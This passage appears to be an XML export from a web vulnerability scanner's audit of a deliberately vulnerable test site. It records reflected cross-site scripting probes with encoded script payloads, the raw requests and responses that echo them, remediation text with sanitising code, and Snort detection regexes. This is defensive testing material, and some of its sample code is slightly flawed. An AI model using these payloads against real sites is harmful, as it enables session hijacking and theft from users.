	Unable to access user database: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:51:03 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>570</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="CDBE14AB68F4F30CB613948FB7735A04"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%31%33%36%36%29%3c%2f%73%43%72%49%70%54%3e&amp;pp=12</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>p</AttackParamDescriptor><Issues><Issue id="212392ca-6721-4baa-a795-b6c7de311248"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%31%33%36%36%29%3c%2f%73%43%72%49%70%54%3e&pp=12 HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CDBE14AB68F4F30CB613948FB7735A04";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2531%2533%2536%2536%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="688bfaef";
X-Request-Memo: ID="662fb5c0";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="285" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="CDBE14AB68F4F30CB613948FB7735A04"><![CDATA[GET /hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%31%33%36%36%29%3c%2f%73%43%72%49%70%54%3e&pp=12 HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CDBE14AB68F4F30CB613948FB7735A04";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2531%2533%2536%2536%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="688bfaef";
X-Request-Memo: ID="662fb5c0";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:51:52 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 36

valid<sCrIpT>alert(41366)</sCrIpT>12]]></RawResponse><Request id="CDBE14AB68F4F30CB613948FB7735A04"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%31%33%36%36%29%3c%2f%73%43%72%49%70%54%3e&amp;pp=12</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%31%33%36%36%29%3c%2f%73%43%72%49%70%54%3e</Value></Query><Query><Name>pp</Name><Value>12</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="CDBE14AB68F4F30CB613948FB7735A04";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2531%2533%2536%2536%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="688bfaef";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="662fb5c0";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid<sCrIpT>alert(41366)</sCrIpT>12]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:51:52 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>36</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="FED8314E6CA06B389F425FD32208661B"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid&amp;pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%32%38%31%37%29%3c%2f%73%43%72%49%70%54%3e</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>pp</AttackParamDescriptor><Issues><Issue id="11430103-6b9d-4e53-96d8-91e24a23c220"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/params.php?p=valid&pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%32%38%31%37%29%3c%2f%73%43%72%49%70%54%3e HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="FED8314E6CA06B389F425FD32208661B";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2532%2538%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="9975598b";
X-Request-Memo: ID="ada02971";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="287" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: 